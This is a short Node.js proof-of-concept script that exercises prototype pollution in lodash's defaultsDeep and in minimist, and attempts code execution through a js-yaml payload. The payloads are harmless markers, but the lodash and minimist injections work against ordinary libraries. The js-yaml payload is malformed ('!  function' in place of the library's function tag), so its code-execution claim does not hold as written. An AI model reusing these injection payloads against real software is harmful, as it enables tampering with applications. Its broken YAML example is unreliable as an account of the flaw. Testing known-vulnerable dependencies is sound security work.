const _ = require('lodash');
const minimist = require('minimist');
const yaml = require('js-yaml');

// 1. Prototype Pollution demonstration using Lodash defaults/merge
console.log('Testing vulnerable lodash...');
const baseObject = {};
console.log('Before pollution: {}');
// In lodash 4.17.11, _.defaultsDeep or _.merge is vulnerable to prototype pollution
_.defaultsDeep({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log(`After potential pollution (baseObject.polluted): ${baseObject.polluted}`);

// 2. Prototype Pollution demonstration using Minimist
console.log('\nTesting vulnerable minimist...');
const args = minimist(['--__proto__.pollutedMinimist', 'yes_minimist']);
console.log(`Polluted minimist check (({}).pollutedMinimist): ${({}).pollutedMinimist}`);

// 3. Remote Code Execution (RCE) / Arbitrary Code Execution demonstration in js-yaml
console.log('\nTesting vulnerable js-yaml...');
try {
  // js-yaml load()/safeLoad() - in 3.13.0 and older, load() parses function types and can execute arbitrary JS code if the schema allows it.
  const payload = 'toString:\n  !  function |-\n    function() { return "RCE Executed"; }';
  const parsed = yaml.load(payload);
  console.log('Parsed YAML:', parsed);
} catch (e) {
  console.error('YAML error:', e.message);
}
